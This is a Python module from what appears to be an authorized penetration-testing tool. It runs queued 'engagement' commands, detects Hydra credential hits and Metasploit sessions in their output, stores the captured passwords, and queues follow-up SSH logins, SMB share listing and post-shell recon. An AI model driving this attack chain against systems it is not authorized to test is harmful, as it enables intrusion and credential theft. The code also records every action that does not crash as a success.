    """
    state = ctx.state
    if action.manual_only:
        # Advisory entry — log it without running anything.
        action.status = "skipped"
        entry = EngagementLogEntry(
            started_at=time.time(), duration=0.0, name=action.name,
            command=list(action.command), risk=action.risk, rc=0,
            summary=action.description,
            output_excerpt="(manual action — not executed by vulnscout)",
            manual=True,
        )
        state.engagement_log.append(entry)
        yield _ev(
            "warning",
            f"manual action queued: {action.name} — copy and run yourself",
            tool="engagement", severity_hint="dim",
        )
        return

    if not is_available(action.command[0]):
        action.status = "failed"
        yield _ev(
            "warning",
            f"{action.command[0]} not installed — install it via the "
            f"Modules screen (m) and retry",
            tool="engagement", severity_hint="warning",
        )
        return

    action.status = "executing"
    action.started_at = time.time()
    yield _ev(
        "tool_start",
        " ".join(shlex.quote(a) for a in action.command),
        tool="engagement",
    )

    buf = ""
    rc = 0
    try:
        async for line in stream(ctx, "engagement", list(action.command)):
            buf += line + "\n"
            yield _ev("output", line, tool="engagement")
        # stream() doesn't surface returncode — infer success if we got
        # output without exception. Accurate rc would require a refactor;
        # for engagement actions the operator inspects the output anyway.
        rc = 0
    except Exception as e:
        rc = 1
        yield _ev(
            "warning",
            f"action {action.name!r} crashed: {e}",
            tool="engagement", severity_hint="warning",
        )

    action.duration = time.time() - action.started_at
    action.rc = rc
    action.output_excerpt = buf[:2000]
    action.status = "completed" if rc == 0 else "failed"

    summary = await llm.translate("engagement", buf or "(no output)")
    action.summary = summary

    entry = EngagementLogEntry(
        started_at=action.started_at, duration=action.duration,
        name=action.name, command=list(action.command),
        risk=action.risk, rc=rc, summary=summary,
        output_excerpt=action.output_excerpt,
    )
    state.engagement_log.append(entry)

    # Surface a Finding so the engagement run shows up in the report
    # alongside Phase 2/3 results — the report walks findings_phase4.
    sev = _result_severity(action, buf)
    finding = Finding(
        severity=sev,
        summary=f"{action.name} — {summary}",
        detail=(
            f"command: {' '.join(shlex.quote(a) for a in action.command)}\n"
            f"risk: {action.risk}\n"
            f"duration: {action.duration:.1f}s\n"
            f"rc: {rc}"
        ),
        tool="engagement", raw=buf[:6000], phase=PHASE,
    )
    state.findings_phase4.append(finding)
    yield _ev("finding", finding=finding, tool="engagement")

    # Programmatic follow-ups (deterministic patterns) + LLM advice.
    follow_ups = _followups_from_output(action, buf, state)
    for fu in follow_ups:
        state.engagement_actions.append(fu)
        yield _ev(
            "output",
            f"queued follow-up: [{fu.risk}] {fu.name}",
            tool="engagement", severity_hint="dim",
        )


# ----------------------------------------------------------------------
# Follow-up suggester
# ----------------------------------------------------------------------


_HYDRA_HIT_RE = re.compile(
    r"\[(?P<port>\d+)\]\[(?P<service>[a-z]+)\]\s+host:\s*(?P<host>\S+)\s+"
    r"login:\s*(?P<user>\S+)\s+password:\s*(?P<pw>\S+)",
    re.IGNORECASE,
)
_MSF_SESSION_RE = re.compile(
    r"(command shell session \d+ opened|Meterpreter session \d+ opened)",
    re.IGNORECASE,
)


def _followups_from_output(
    action: EngagementAction, output: str, state: ScanState,
) -> List[EngagementAction]:
    """Parse common output patterns and queue concrete next actions.

    We only generate deterministic follow-ups here. Free-form LLM
    advice is surfaced separately in the Phase 4 panel — those don't
    become queue entries because they aren't always actionable
    commands.
    """
    out: List[EngagementAction] = []

    # SSH auth-method probe → set the gating flag for SSH brute-force
    # before parsing hydra hits below. The probe surfaces the supported
    # auth methods in the server's refusal message.
    if "ssh auth-method probe" in action.name.lower():
        lower = output.lower()
        # Server replies look like:
        #   `Permission denied (publickey,password,keyboard-interactive).`
        #   `Permission denied (publickey).`
        if "permission denied" in lower and "password" in lower:
            state.ssh_password_auth_confirmed = True
        elif "permission denied" in lower and "publickey" in lower:
            state.ssh_password_auth_confirmed = False
        # Some servers drop the connection without the methods string —
        # leave the flag at None so the brute-force action stays out of
        # the queue rather than being incorrectly enabled.

    # Hydra hit → record the credential into ScanState, THEN queue the
    # service-specific verification follow-up. The recorded cred drives
    # the cred-flow tier (kerberoast, BloodHound, secretsdump, wmiexec)
    # on the next queue rebuild.
    for m in _HYDRA_HIT_RE.finditer(output):
        host, user, pw, service = m["host"], m["user"], m["pw"], m["service"].lower()
        cred_key = (user, pw, service)
        if cred_key not in state.confirmed_creds:
            state.confirmed_creds.append(cred_key)
        if service == "ssh":
            out.append(EngagementAction(
                name=f"Login via SSH — {user}@{host}",
                description=(
                    f"sshpass -p <pw> ssh -o StrictHostKeyChecking=no "
                    f"{user}@{host} 'whoami; id; uname -a'"
                ),
                command=[
                    "sshpass", "-p", pw,
                    "ssh", "-o", "StrictHostKeyChecking=no",
                    "-o", "BatchMode=no",
                    f"{user}@{host}",
                    "whoami; id; uname -a",
                ],
                risk="MEDIUM",
                expected_output=(
                    "On success the remote shell prints whoami / id / "
                    "uname output. Failed auth shows 'Permission denied'."
                ),
                required_tool="sshpass",
                rationale=(
                    "Hydra confirmed the credential — log in and capture "
                    "fingerprint info to choose the right priv-esc next."
                ),
                finding_ref=f"hydra ssh hit {user}@{host}",
            ))
        elif service in ("smb", "smbnt", "smb2"):
            out.append(EngagementAction(
                name=f"List SMB shares — {user}@{host}",
                description=f"smbclient -L //{host} -U {user}%<pw>",
                command=[
                    "smbclient", "-L", f"//{host}", "-U", f"{user}%{pw}",
                ],
                risk="LOW",
                expected_output="smbclient prints the share list.",
                required_tool="smbclient",
                rationale=(
                    "Hydra hit the SMB credential — listing shares is "
                    "the obvious next-step before mounting anything."
                ),
                finding_ref=f"hydra smb hit {user}@{host}",
            ))

    # MSF session opened → queue post-shell recon (manual — we don't own
    # the spawned session).
    if _MSF_SESSION_RE.search(output):
        for label, cmd_text, what in _POST_SHELL_RECON:
            out.append(EngagementAction(
                name=f"Post-shell — {label}",
                description=f"in the gained session, run: {cmd_text}",
                command=["echo", f"manual: in MSF session, run `{cmd_text}`"],
                risk="LOW",
                expected_output=what,
                required_tool="echo",
                rationale=(
                    "An MSF session opened — these are the standard "
                    "first-contact recon commands. They run inside the "
                    "remote shell, not here, so they're listed as manual."
                ),
                finding_ref="msf session",
                manual_only=True,
            ))

    # Mark every follow-up so the UI can render a NEW chip on it for one
    # render pass. Cleared on the next rebuild.
    for a in out:
        a.is_new = True

    return out


def append_followups_async(
    llm: LLMClient, state: ScanState, action: EngagementAction,
    output: str,
) -> str:
    """Returns the LLM's free-form follow-up advice text. Intended to be
    called from `execute_action` callers that want to display the LLM
    paragraph in the panel; we keep it out of `execute_action` itself
    so the streaming generator stays linear.
    """
    # Synchronous wrapper — caller decides whether to await.
    raise NotImplementedError(
        "Call llm.translate('engagement-followup', output) directly from "
        "the UI; this stub is intentionally not implemented."
    )


# ----------------------------------------------------------------------
# Helpers
# ----------------------------------------------------------------------


def _primary_host(state: ScanState) -> str:
    """Pick the address hydra/MSF should target.

    For ip/cidr targets we use the literal IP. For domain/url we prefer
    the resolved IP (so DNS resolution doesn't happen twice — once in
    the scanner, once in hydra) but fall back to the bare domain.
    """
    if state.target_type == "ip":
        return state.target
    if state.ip_addresses:
        return state.ip_addresses[0]
    if state.target_type == "domain":
        return state.target
    if state.target_type == "url":
        from urllib.parse import urlparse
        return urlparse(state.target).hostname or ""
    return ""


def _all_web_urls(state: ScanState) -> List[str]:
    """All open web URLs on the target, in primary-first order.

    `_primary_web_url` returns just the "best" URL (HTTPS preferred,
    then ascending port). Many real targets host genuinely different
    apps on each port (e.g. 80 = nginx reverse proxy, 8080 = Tomcat),
    so the Phase 2 web chain and the tech-action generator iterate
    over this list to cover every port instead of just the first.
    """
    if state.target_type == "url":
        return [state.target.rstrip("/")]
    host = _primary_host(state)
    if not host:
        return []
    https_ports = {443, 8443}
    web_ports = {80, 443, 8080, 8443, 8000, 8888, 8081, 3000, 5000, 9000}
    web_open = [p for p in state.open_ports if p.port in web_ports]
    if not web_open:
        return []
    web_open.sort(key=lambda p: (0 if p.port in https_ports else 1, p.port))
    out: List[str] = []
    seen: set = set()
    for p in web_open:
        scheme = "https" if p.port in https_ports else "http"
        url = f"{scheme}://{host}:{p.port}"
        if url not in seen:
            seen.add(url)
            out.append(url)
    return out


def _primary_web_url(state: ScanState) -> str:
    if state.target_type == "url":
        return state.target.rstrip("/")
    host = _primary_host(state)
    if not host:
        return ""
    https_ports = {443, 8443}
    web_ports = {80, 443, 8080, 8443, 8000, 8888, 8081, 3000}
    web_open = [p for p in state.open_ports if p.port in web_ports]
    if not web_open:
        return ""
    web_open.sort(key=lambda p: (0 if p.port in https_ports else 1, p.port))
    p = web_open[0]
    scheme = "https" if p.port in https_ports else "http"
    return f"{scheme}://{host}:{p.port}"


def _collect_usernames(state: ScanState) -> List[str]:
    """Backward-compat: flat list of names. Prefer `_high_conf_usernames`
    which honors per-name confidence and source-file provenance.

    Accepts both old-shape (`List[str]`) and new-shape
    (`List[DiscoveredUsername]`) entries in `state.discovered_usernames`
    so a partial migration doesn't crash the queue builder.
    """
    out: List[str] = []
    seen: set = set()
    raw_names: List[str] = []
    for u in state.discovered_usernames:
        raw_names.append(u if isinstance(u, str) else u.username)
    sources = [
        raw_names,
        _emails_to_locals(state.osint_emails),
        _emails_to_locals(state.hunter_emails),
    ]
    for src in sources:
        for u in src:
            key = u.lower()
            if key not in seen and re.match(r"^[A-Za-z][A-Za-z0-9._-]{1,31}$", u):
                seen.add(key)
                out.append(u)
    return out


def _emails_to_locals(emails: List[str]) -> List[str]:
    out = []
    for e in emails:
        # `name (Display Name)` formats land here; strip the parens part.
        addr = e.split(" ")[0]
        if "@" in addr:
            local = addr.split("@", 1)[0]
            if local:
                out.append(local)
    return out


def _resolve_password_list(settings: dict) -> str:
    """Pick a password list. User-supplied wordlist wins; SecLists / rockyou
    fall back. Empty string means we can't run brute-force actions."""
    user_path = (settings or {}).get("password_list") or ""
    if user_path and os.path.exists(user_path):
        return user_path
    for path in _PASSWORD_LIST_CANDIDATES:
        if os.path.exists(path):
            return path
    return ""


def _materialize_users_file(state: ScanState, users: List[str]) -> str:
    """Write usernames to a temp file and stash the path in state for
    later cleanup. Same file is reused across actions in this build pass
    by keying on the user-list contents.
    """
    fd, path = tempfile.mkstemp(prefix="vulnscout-users-", suffix=".txt")
    with os.fdopen(fd, "w") as f:
        f.write("\n".join(users) + "\n")
    state.engagement_tmpfiles.append(path)
    return path


def cleanup_tmpfiles(state: ScanState) -> None:
    """Remove every temp file created on behalf of engagement actions.
    Called from the app's Reset path."""
    for p in list(state.engagement_tmpfiles):
        try:
            os.unlink(p)
        except OSError:
            pass
    state.engagement_tmpfiles.clear()


def _result_severity(action: EngagementAction, output: str) -> str:
    """Pick a Finding severity for the engagement entry.

    A confirmed credential hit or shell session is CRITICAL. Successful
    runs that don't confirm anything land at the action's risk level so
    HIGH-risk actions don't quietly get filed as INFO.
    """
    lower = output.lower()
    if _HYDRA_HIT_RE.search(output) or _MSF_SESSION_RE.search(output):
        return "CRITICAL"
    if action.status == "failed":
        return "LOW"
    if action.risk in ("HIGH", "CRITICAL"):
        return "MEDIUM"
    return "INFO"


def _ev(
    kind: str, text: str = "", tool: str = "",
    finding: Optional[Finding] = None, severity_hint: str = "",
) -> PhaseEvent:
    return PhaseEvent(
        kind=kind, text=text, tool=tool, finding=finding,
        severity_hint=severity_hint, phase=PHASE,
    )
